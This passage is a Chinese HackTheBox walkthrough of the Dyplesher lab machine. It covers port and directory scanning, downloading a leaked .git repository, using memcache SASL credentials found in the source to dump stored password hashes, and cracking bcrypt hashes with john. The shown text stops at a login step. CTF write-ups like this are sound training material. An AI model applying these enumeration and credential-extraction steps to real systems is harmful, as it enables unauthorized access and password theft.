> 原文链接: https://www.anquanke.com//post/id/223355 


# HackTheBox-Dyplesher靶机渗透笔记


                                阅读量   
                                **102204**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t0117c527893b56439d.png)](https://p0.ssl.qhimg.com/t0117c527893b56439d.png)



## 前言

本文主要是记录下对HackTheBox靶机Dyplesher的渗透过程，该靶机的难度评级为Insane，从这个靶机可以学习到memcache、MineCraft Maven插件制作以及AMQP协议相关的知识。



## 信息收集

```
# Nmap 7.91 scan initiated Sat Oct 31 09:52:23 2020 as: nmap -sSVC -pn -oA nmap_full -v 10.10.10.190
Nmap scan report for 10.10.10.190
Host is up (0.0020s latency).
Not shown: 65525 filtered ports
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)
80/tcp    open   http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp  open   ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=cab4d447d0b05838; Path=/; HttpOnly
|     Set-Cookie: _csrf=AWdLS2HY7sj9MGl_uzy9BIdiyCU6MTYwNDEzODA2Nzk5MDYzMzkwMA%3D%3D; Path=/; Expires=Sun, 01 Nov 2020 09:54:27 GMT; HttpOnly
|     Date: Sat, 31 Oct 2020 09:54:27 GMT
|     &lt;!DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;head data-suburl=""&gt;
|     &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"/&gt;
|     &lt;meta name="author" content="Gogs" /&gt;
|     &lt;meta name="description" content="Gogs is a painless self-hosted Git service" /&gt;
|     &lt;meta name="keywords" content="go, git, self-hosted, gogs"&gt;
|     &lt;meta name="referrer" content="no-referrer" /&gt;
|     &lt;meta name="_csrf" content="AWdLS2HY7sj9MGl_uzy9BIdiyCU6MTYwNDEzODA2Nzk5MDYzMzkwMA==" /&gt;
|     &lt;meta name="_suburl" content="" /&gt;
|     &lt;meta proper
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=cb192a56afa1412c; Path=/; HttpOnly
|     Set-Cookie: _csrf=WNCCxXx-RAstuqnsdyse0s19mWI6MTYwNDEzODA3MzA3NjcyNTg4Nw%3D%3D; Path=/; Expires=Sun, 01 Nov 2020 09:54:33 GMT; HttpOnly
|     Date: Sat, 31 Oct 2020 09:54:33 GMT
|     &lt;!DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;head data-suburl=""&gt;
|     &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"/&gt;
|     &lt;meta name="author" content="Gogs" /&gt;
|     &lt;meta name="description" content="Gogs is a painless self-hosted Git service" /&gt;
|     &lt;meta name="keywords" content="go, git, self-hosted, gogs"&gt;
|     &lt;meta name="referrer" content="no-referrer" /&gt;
|     &lt;meta name="_csrf" content="WNCCxXx-RAstuqnsdyse0s19mWI6MTYwNDEzODA3MzA3NjcyNTg4Nw==" /&gt;
|     &lt;meta name="_suburl" content="" /&gt;
|_    &lt;meta
4369/tcp  open   epmd       Erlang Port Mapper Daemon
|_epmd-info: ERROR: Script execution failed (use -d to debug)
5672/tcp  open   amqp       Advanced Message Queue Protocol
|_amqp-info: Unable to open connection: TIMEOUT
11211/tcp open   memcache?
25562/tcp open   unknown
25565/tcp open   minecraft?
25572/tcp closed unknown
25672/tcp open   unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.91%I=7%D=10/31%Time=5F9D3452%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2063,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/
SF:;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=cab4d447d0b05838;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=AWdLS2HY7sj9MGl_uzy9BId
SF:iyCU6MTYwNDEzODA2Nzk5MDYzMzkwMA%3D%3D;\x20Path=/;\x20Expires=Sun,\x2001
SF:\x20Nov\x202020\x2009:54:27\x20GMT;\x20HttpOnly\r\nDate:\x20Sat,\x2031\
SF:x20Oct\x202020\x2009:54:27\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;h
SF:ead\x20data-suburl=\"\"&gt;\n\t&lt;meta\x20http-equiv=\"Content-Type\"\x20con
SF:tent=\"text/html;\x20charset=UTF-8\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"X-U
SF:A-Compatible\"\x20content=\"IE=edge\"/&gt;\n\t\n\t\t&lt;meta\x20name=\"author
SF:\"\x20content=\"Gogs\"\x20/&gt;\n\t\t&lt;meta\x20name=\"description\"\x20cont
SF:ent=\"Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\"\x2
SF:0/&gt;\n\t\t&lt;meta\x20name=\"keywords\"\x20content=\"go,\x20git,\x20self-ho
SF:sted,\x20gogs\"&gt;\n\t\n\t&lt;meta\x20name=\"referrer\"\x20content=\"no-refe
SF:rrer\"\x20/&gt;\n\t&lt;meta\x20name=\"_csrf\"\x20content=\"AWdLS2HY7sj9MGl_uz
SF:y9BIdiyCU6MTYwNDEzODA2Nzk5MDYzMzkwMA==\"\x20/&gt;\n\t&lt;meta\x20name=\"_subu
SF:rl\"\x20content=\"\"\x20/&gt;\n\t\n\t\n\t\n\t\t&lt;meta\x20proper")%r(Help,67
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r
SF:(HTTPOptions,189F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type:\x2
SF:0text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;\x
SF:20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=cb192a56afa1412c;\x2
SF:0Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=WNCCxXx-RAstuqnsdyse0s19mW
SF:I6MTYwNDEzODA3MzA3NjcyNTg4Nw%3D%3D;\x20Path=/;\x20Expires=Sun,\x2001\x2
SF:0Nov\x202020\x2009:54:33\x20GMT;\x20HttpOnly\r\nDate:\x20Sat,\x2031\x20
SF:Oct\x202020\x2009:54:33\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;head
SF:\x20data-suburl=\"\"&gt;\n\t&lt;meta\x20http-equiv=\"Content-Type\"\x20conten
SF:t=\"text/html;\x20charset=UTF-8\"\x20/&gt;\n\t&lt;meta\x20http-equiv=\"X-UA-C
SF:ompatible\"\x20content=\"IE=edge\"/&gt;\n\t\n\t\t&lt;meta\x20name=\"author\"\
SF:x20content=\"Gogs\"\x20/&gt;\n\t\t&lt;meta\x20name=\"description\"\x20content
SF:=\"Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\"\x20/&gt;
SF:\n\t\t&lt;meta\x20name=\"keywords\"\x20content=\"go,\x20git,\x20self-hoste
SF:d,\x20gogs\"&gt;\n\t\n\t&lt;meta\x20name=\"referrer\"\x20content=\"no-referre
SF:r\"\x20/&gt;\n\t&lt;meta\x20name=\"_csrf\"\x20content=\"WNCCxXx-RAstuqnsdyse0
SF:s19mWI6MTYwNDEzODA3MzA3NjcyNTg4Nw==\"\x20/&gt;\n\t&lt;meta\x20name=\"_suburl\
SF:"\x20content=\"\"\x20/&gt;\n\t\n\t\n\t\n\t\t&lt;meta");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 31 09:57:04 2020 -- 1 IP address (1 host up) scanned in 281.27 seconds
```

由nmap扫描可知，目前开放的端口为：

```
22/tcp    open   ssh
80/tcp    open   http
3000/tcp  open   ppp?
4369/tcp  open   epmd
5672/tcp  open   amqp
11211/tcp open   memcache?
25562/tcp open   unknown
25565/tcp open   minecraft?
25572/tcp closed unknown
25672/tcp open   unknown
```

首先访问目标主机的web服务页面 [http://10.10.10.190](http://10.10.10.190) ，在Apache上托管着Minecraft Server，并且提示对应的域名是`test.dyplesher.htb`:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011d65bbdc868d15cc.png)

将hostname添加到`/etc/hosts`文件中：

```
10.10.10.190    dyplesher.htb test.dyplesher.htb
```

访问[http://test.dyplesher.htb](http://test.dyplesher.htb) ：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01aaaf1a2b85b4c51c.png)

是一个memcache相关的界面，看来网站使用了memcache进行优化。

回到 [http://dyplesher.htb](http://dyplesher.htb) ，点击上面的链接，发现只有3个活链接：

```
https://twitter.com/_felamos
https://www.youtube.com/watch?v=hCKmBmJdpho
http://10.10.10.190/staff
```

访问staff页面，有三个用户：

```
MinatoTW, owner
felamos, dev
yuntao, admin
```

[![](https://p0.ssl.qhimg.com/t015b4cea034286becb.png)](https://p0.ssl.qhimg.com/t015b4cea034286becb.png)

这三个用户的头像下都有一个齿轮icon，对应三个链接：

```
http://dyplesher.htb:8080/arrexel
http://dyplesher.htb:8080/felamos
http://dyplesher.htb:8080/yuntao
```

这个齿轮，如果我们利用图片搜索去查询的话，会发现这是名为gogs的git服务：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011cb31a8c444ad2d7.png)

与gogs相关的信息在nmap的扫描结果中也有出现过，对应的端口是3000：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013892fc985f990301.png)

所以上面的3个真实链接应该是：

```
http://dyplesher.htb:3000/arrexel
http://dyplesher.htb:3000/felamos
http://dyplesher.htb:3000/yuntao
```

访问之后并没有什么公开的信息：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0156af79a66fd347cd.png)

gogs上既然提供了注册登录功能，所以注册一个账号test然后登录，在`Explore -&gt; Users`这里也看到了3个用户以及他们的注册邮箱，除此之外也没有什么新发现：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0162a485c0a073ed41.png)

### <a class="reference-link" name="MemCache%E6%9C%8D%E5%8A%A1"></a>MemCache服务

再看[http://test.dyplesher.htb](http://test.dyplesher.htb) 页面，也就是前面发现的memcache服务，什么是memcache呢？MemCache是一个高性能、分布式的内存对象缓存系统，它通过在内存中缓存数据和对象来减少读取数据库的次数，从而提高网站的访问速度。

这个页面接收两个参数，如果值相等，返回200 response：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cdcf3de3f36e0c39.png)

如果不同，则返回500：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cd5b450a78cdaa0e.png)

利用memcache工具，我们可以枚举存储在memcache数据库中的键值对：

```
apt-get install libmemcached-tools
```

然后尝试用`memccat`去访问key `aaa`的值：

```
╭─kali@kali ~ 
╰─$ memccat --server=10.10.10.190 aaa
error on aaa(NOT FOUND)
```

这种方式行不通，有可能是因为memcache开启了某种验证机制，比如`Simple Authentication and Security Layer (SASL)`。

```
╭─kali@kali /usr/share/dirb/wordlists 
╰─$ ffuf -u http://dyplesher.htb/FUZZ -w /usr/share/dirb/wordlists/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://dyplesher.htb/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 200, Size: 4242, Words: 1281, Lines: 124]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
cgi-bin/                [Status: 301, Size: 315, Words: 20, Lines: 10]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
home                    [Status: 302, Size: 350, Words: 60, Lines: 12]
img                     [Status: 301, Size: 312, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 4252, Words: 1281, Lines: 124]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
login                   [Status: 200, Size: 4188, Words: 1222, Lines: 84]
register                [Status: 302, Size: 350, Words: 60, Lines: 12]
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
staff                   [Status: 200, Size: 4389, Words: 1534, Lines: 103]
:: Progress: [4614/4614] :: Job [1/1] :: 135 req/sec :: Duration: [0:00:34] :: Errors: 0 ::
```

除了`/staff`之外，发现了其他隐藏的链接`/home`、`login`和`/register`，访问这些页面最后都会重定向到`/login`页面：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0182dec13f91d8d879.png)

用密码字典和sqlmap进行爆破失败后，接着用`ffuf`扫描`test.dyplesher.htb`站点：

```
╭─kali@kali /usr/share/dirb/wordlists 
╰─$ ffuf -u http://test.dyplesher.htb/FUZZ -w /usr/share/dirb/wordlists/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://test.dyplesher.htb/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 200, Size: 239, Words: 16, Lines: 15]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
index.php               [Status: 200, Size: 239, Words: 16, Lines: 15]
.htaccess               [Status: 403, Size: 283, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 283, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 283, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 283, Words: 20, Lines: 10]
:: Progress: [4614/4614] :: Job [1/1] :: 1153 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

发现`.git`泄露，利用[GitHack](https://github.com/lijiejie/GitHack)下载泄露的源码，只有一个index.php文件：

```
╭─kali@kali ~/htb-tools/GitHack ‹master*› 
╰─$ python GitHack.py http://test.dyplesher.htb/.git/
[+] Download and parse index file ...
README.md
index.php
[OK] index.php
[OK] README.md
```

这个页面就是 [http://test.dyplesher.htb](http://test.dyplesher.htb) 页面的源码，会将`&lt;key, value&gt;`以键值对的方式添加到MemCache数据库中：

```
&lt;HTML&gt;
&lt;BODY&gt;
&lt;h1&gt;Add key and value to memcache&lt;h1&gt;
&lt;FORM METHOD="GET" NAME="test" ACTION=""&gt;
&lt;INPUT TYPE="text" NAME="add"&gt;
&lt;INPUT TYPE="text" NAME="val"&gt;
&lt;INPUT TYPE="submit" VALUE="Send"&gt;
&lt;/FORM&gt;

&lt;pre&gt;
&lt;?php
if($_GET['add'] != $_GET['val'])`{`
        $m = new Memcached();
        $m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, true);
        $m-&gt;setSaslAuthData("felamos", "zxcvbnm");
        $m-&gt;addServer('127.0.0.1', 11211);
        $m-&gt;add($_GET['add'], $_GET['val']);
        echo "Done!";
`}`
else `{`
        echo "its equal";
`}`
?&gt;
&lt;/pre&gt;

&lt;/BODY&gt;
&lt;/HTML&gt;
```

`Memcached::setSaslAuthData()`函数的作用是设置应用于与memcache服务器进行SASL身份验证的用户名和密码，从源码可知用户名是`felamos`，密码是`zxcvbnm`。

### <a class="reference-link" name="%E6%9E%9A%E4%B8%BEMemcache%E9%94%AE%E5%80%BC%E5%AF%B9"></a>枚举Memcache键值对

python3 安装[python-binary-memcached](https://pypi.org/project/python-binary-memcached/)模块：

```
pip install python-binary-memcached
```

写了一个简单的脚本：

```
import bmemcached
client = bmemcached.Client(('10.10.10.190:11211', ), 'felamos', 'zxcvbnm')
fp = open('/usr/share/wordlists/rockyou.txt','r')
line = fp.readline().strip()
while line:
    response = client.get(line)
    if response:
        print(line + ": " + response)
        break
    line = fp.readline().strip()

fp.close()
```

得到3个加密后的密码：

```
minato:$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
felamos:$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
yuntao:$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
```

另一种更方便的方式是使用`memcached-cli`：

```
apt install npm
npm install -g memcached-cli
```

```
╭─kali@kali ~ 
╰─$ memcached-cli felamos:zxcvbnm@dyplesher.htb:11211

dyplesher.htb:11211&gt; get username
MinatoTW
felamos
yuntao

dyplesher.htb:11211&gt; get password
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
```

丢到john里解密，得到用户felamos的密码：

```
╭─kali@kali ~ 
╰─$ john hashes --wordlist=/root/htb-tools/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Press 'q' or Ctrl-C to abort, almost any other key for status
mommy1           (felamos)
```

用密码`[felamos@dyplesher.htb](mailto:felamos@dyplesher.htb) : mommy1`尝试登录 [http://dyplesher.htb/login](http://dyplesher.htb/login) ，登录失败，再尝试登录gogs服务 [http://dyplesher.htb:3000/user/login?redirect_to=](http://dyplesher.htb:3000/user/login?redirect_to=) 登录成功。登录之后看到felamos用户是拥有两个Repositories，然后还提交了commit：

[![](https://p2.ssl.qhimg.com/t0184ffd3a6569da671.png)](https://p2.ssl.qhimg.com/t0184ffd3a6569da671.png)

在名为gitlab的仓库里发现了felamos发布的一个releases：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d6d030cdaf088730.png)

### <a class="reference-link" name="Git%20Bundle"></a>Git Bundle

下载解压后是一个`repositories`文件夹，文件夹下有一些bundle文件：

```
╭─kali@kali ~/repositories 
╰─$ tree
.
`-- @hashed
    |-- 4b
    |   `-- 22
    |       `-- 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
    |-- 4e
    |   `-- 07
    |       |-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
    |       `-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
    |-- 6b
    |   `-- 86
    |       `-- 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
    `-- d4
        `-- 73
            `-- d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle

10 directories, 4 files
```

file命令查看这些bundle文件信息，这些bundle是git bundle：

```
╭─kali@kali ~/repositories 
╰─$ file @hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle: Git bundle
```

git bundle是有用的线下仓库传输工具，在一些情况下，一个人很难直接git clone仓库（git clone很慢或是仓库过大），这个时候就可以通过bundle命令将git仓库打包，然后通过U盘或是其他方式进行传输。使用git clone来进行unbundle操作：

```
git clone @hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
git clone @hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
git clone @hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
git clone @hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
```

查看有哪些文件：

```
kali@kali:~/repositories# tree
.
|-- 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
|   |-- LICENSE
|   |-- README.md
|   `-- src
|       `-- VoteListener.py
|-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
|   |-- README.md
|   |-- banned-ips.json
|   |-- banned-players.json
|   |-- bukkit.yml
|   |-- commands.yml
|   |-- craftbukkit-1.8.jar
|   |-- eula.txt
|   |-- help.yml
|   |-- ops.json
|   |-- permissions.yml
|   |-- plugins
|   |   |-- LoginSecurity
|   |   |   |-- authList
|   |   |   |-- config.yml
|   |   |   `-- users.db
|   |   |-- LoginSecurity.jar
|   |   `-- PluginMetrics
|   |       `-- config.yml
|   |-- python
|   |   `-- pythonMqtt.py
|   |-- sc-mqtt.jar
|   |-- server.properties
|   |-- spigot-1.8.jar
|   |-- start.command
|   |-- usercache.json
|   |-- whitelist.json
|   |-- world
|   |   |-- data
|   |   |   |-- villages.dat
|   |   |   `-- villages_end.dat
|   |   |-- level.dat
|   |   |-- level.dat_mcr
|   |   |-- level.dat_old
|   |   |-- playerdata
|   |   |   `-- 18fb40a5-c8d3-4f24-9bb8-a689914fcac3.dat
|   |   |-- region
|   |   |   |-- r.-1.0.mca
|   |   |   `-- r.0.0.mca
|   |   |-- session.lock
|   |   `-- uid.dat
|   `-- world_the_end
|       |-- DIM1
|       |   `-- region
|       |       |-- r.-1.-1.mca
|       |       |-- r.-1.0.mca
|       |       |-- r.0.-1.mca
|       |       `-- r.0.0.mca
|       |-- level.dat
|       |-- level.dat_old
|       |-- session.lock
|       `-- uid.dat
|-- 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
|   |-- LICENSE
|   |-- README.md
|   |-- phpbash.min.php
|   `-- phpbash.php
|-- @hashed
|   |-- 4b
|   |   `-- 22
|   |       `-- 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
|   |-- 4e
|   |   `-- 07
|   |       |-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
|   |       `-- 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
|   |-- 6b
|   |   `-- 86
|   |       `-- 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
|   `-- d4
|       `-- 73
|           `-- d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
`-- d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35
    |-- LICENSE.txt
    |-- README.md
    `-- nightminer.py

26 directories, 54 files
```

可以看到在`4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity`下有一个名为`users.db`的数据库文件。

用file命令查看发现是sqlite数据库文件：

```
╭─kali@kali ~/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity ‹master› 
╰─$ file users.db
users.db: SQLite 3.x database, last written using SQLite version 3027002
```

`.tables`命令查看数据表信息：

```
╭─kali@kali ~/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity ‹master› 
╰─$ sqlite3 users.db
SQLite version 3.33.0 2020-08-14 13:23:32
Enter ".help" for usage hints.
sqlite&gt; .tables
users
```

设置`.header on`显示表头，不然会看得比较懵：

```
sqlite&gt; .header on
sqlite&gt; select * from users;
unique_user_id|password|encryption|ip
18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81
```

有一串加密密码，利用john the ripper解密，得到`alexis1`：

```
╭─kali@kali ~ 
╰─$ cat hash
$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6
╭─kali@kali ~ 
╰─$ john hash --wordlist=/root/htb-tools/wordlists/rockyou.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
alexis1          (?)
1g 0:00:00:56 DONE (2020-11-05 08:08) 0.01768g/s 28.06p/s 28.06c/s 28.06C/s alexis1..cameron1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

利用这个密码`[felamos@dyplesher.htb](mailto:felamos@dyplesher.htb) : alexis1`登录 [http://dyplesher.htb/login](http://dyplesher.htb/login) :

